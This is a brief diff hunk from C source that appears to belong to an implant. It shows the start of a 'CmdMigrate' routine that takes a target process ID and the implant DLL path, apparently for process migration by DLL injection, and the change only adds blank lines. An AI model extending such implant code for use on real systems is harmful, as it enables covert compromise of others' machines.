@@ -1401,6 +1401,10 @@ DWORD CmdMigrate(
     targetPid = *(DWORD*)data;
 
     dllPath = GetImplantDllPath();
+
+
+  
+
     if (!dllPath || dllPath[0] == L'\0') return ERROR_INVALID_REQUEST;
 
     dllPathBytes = (wcslen(dllPath) + 1U) * sizeof(WCHAR);
